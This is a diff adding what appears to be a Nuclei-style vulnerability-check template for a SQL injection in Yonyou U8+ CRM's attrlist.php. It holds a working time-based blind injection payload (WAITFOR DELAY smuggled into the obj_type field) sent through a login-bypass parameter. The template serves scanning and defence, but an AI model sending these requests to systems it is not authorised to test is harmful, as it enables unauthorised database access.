@@ -1,0 +1,55 @@
+id: poc-yaml-yongyon-u8-crm-attrlist-sqli
+info:
+  name: 用友U8CRM attrlist SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    affected-product: 用友U8+CRM
+
+variables:
+  t1: "{{rand_int(2,6)}}"
+  t2: "{{to_number(t1)+2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "step-1"
+    method: GET
+    path:
+      - "{{BaseURL}}/devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Database error"
+        part: body
+
+  - id: "step-2"
+    method: POST
+    path:
+      - "{{BaseURL}}/devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1"
+    headers:
+      Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
+      Content-Type: application/x-www-form-urlencoded
+    body: "obj_type=1';WAITFOR+DELAY+'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"root\":"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > t1 && duration < t2"
